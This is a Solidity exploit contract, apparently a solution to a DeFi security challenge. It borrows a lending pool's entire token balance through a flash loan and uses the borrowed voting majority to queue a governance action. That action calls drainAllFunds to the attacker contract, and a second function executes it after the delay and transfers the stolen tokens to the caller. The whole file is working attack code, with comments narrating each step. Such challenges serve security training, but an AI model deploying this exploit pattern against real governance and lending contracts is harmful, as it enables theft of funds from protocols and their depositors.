// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Pool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface Governance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IERC20 {
    function transfer(address to, uint amount) external;
    function balanceOf(address acc) external returns (uint);
    function snapshot() external returns (uint256);
}

contract Exploit6 {
    Pool pool;
    Governance g;
    IERC20 token;
    uint actionId;

    function attack(address pool_, address governance_, address token_) public {
        // 
        pool = Pool(pool_);
        g = Governance(governance_);
        token = IERC20(token_);


        uint amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);        
    }

    function receiveTokens(address token_, uint256 amount_) public {
        address receiver = address(pool);
        bytes memory payload = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        uint weiAmount;

        // needs at least 1 snapshot to queueAction
        token.snapshot();

        // with majority of tokens from flashloan, we can queue an action
        // this action will drain the tokens to this contract
        actionId = g.queueAction(receiver, payload, weiAmount);
        require(actionId > 0, "action queue fail");

        // repay the loan
        token.transfer(address(pool), amount_);
    }

    // call after 2 days have passed since action was queued in governance
    // send tokens to attacker
    function attack2() public {
        g.executeAction(actionId);
        uint amount = token.balanceOf(address(this));
        token.transfer(msg.sender, amount);

    }
}